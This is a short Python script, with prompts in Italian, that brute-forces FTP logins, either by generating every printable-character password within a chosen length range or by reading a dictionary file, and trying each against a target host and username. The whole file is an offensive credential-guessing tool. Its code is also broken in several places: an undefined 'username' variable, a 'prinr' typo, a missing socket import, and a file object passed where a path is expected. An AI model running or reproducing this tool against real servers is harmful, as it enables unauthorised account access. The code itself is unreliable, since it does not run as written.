import ftplib, itertools, string
def config(host,username,password):
    ftp = ftplib.FTP(host)
    ftp.login(username, password)
    ftp.quit()

def Wordlist(minimo, massimo, host):
    minimo = int(minimo)
    massimo = int(massimo)
    create = open('wordlist.txt', 'w')
    chrs = string.printable.replace(' \t\n\r\x0b\x0c', '')
    print ("- Creo il File Wordlist in: { wordlist.txt }")
    print ("- Perfavore Aspetta...")

    for n in range(minimo, massimo+1):
        for xs in itertools.product(chrs, repeat=n):
            saved = ''.join(xs)
            create.write("%s\n" % saved)

    create.close()
    attacco(host, create)


def attacco(host, passfile):
    passfile = str(passfile)
    passfile = open(passfile, 'r')

    for password in passfile.readlines():
        password = password.strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP(host)
            ftp.login(username, password)
            ftp.quit()
            password = str(password)
            prinr("\nTrovato \nUsername: %s\nPassword: %s" %(username, password))
        except socket.gaierror:
            print("Host non valido")
        except Exception as E:
            print("Non Trovato:" + str(password) + E)



def main():
    sc = input("[B]ruteforce\n[D]izionario\n>>>")
    if sc == "B":
        host = input("Host >> ")
        username = input("Username >> ")
        minimo = input("\n- Inserisci la Lunghezza  Minima: ")
        massimo = input("- Inserisci la Lunghezza Massima: ")
        wordList = 'wordlist.txt'
        Wordlist(minimo, massimo, host)

    elif sc == "D":
        host = input("Host >> ")
        username = input("Username >> ")
        passFile = input("Pass File >> ")
        attacco(host, passFile)




if __name__ == '__main__':
    main()